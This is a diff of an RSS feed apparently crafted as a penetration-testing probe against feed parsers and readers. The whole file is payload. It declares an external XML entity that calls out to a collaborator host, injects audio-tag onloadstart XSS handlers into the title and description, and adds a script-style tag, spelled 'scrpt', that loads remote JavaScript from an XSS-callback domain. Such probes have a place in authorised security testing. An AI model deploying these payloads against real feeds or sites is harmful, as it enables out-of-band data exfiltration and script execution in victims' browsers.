@@ -3,14 +3,14 @@
 <!ENTITY xxe SYSTEM "http://w526zbhql1u2a8jpxggtwv3gz752tr.cigitalcollaborator.com/aswd" >]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 <channel>
-    <title>alert</title>
+    <title><audio src onloadstart=alert(1)></title>
     <link>http://r4w1y6glkwtx93ikwbfovq2by24ysn.cigitalcollaborator.com</link>
-    <description>onloadstart=alert(456)</description>
+    <description><audio src onloadstart=alert(2)></description>
     <lastBuildDate>Fri, 12 Jun 2020 00:00:00 -0000</lastBuildDate>
     <item>
         <title>&xxe;</title>
         <link>http://qmg0g5yk2vbwr20jeaxndpkag1myan.cigitalcollaborator.com</link>
-        <description>https://game0ver.xss.ht</description>
+        <description><scrpt src=https://game0ver.xss.ht></script></description>
         <author>author@example.com</author>
         <pubDate>Fri, 12 Jun 2020 00:00:00 -0000</pubDate>
     </item>
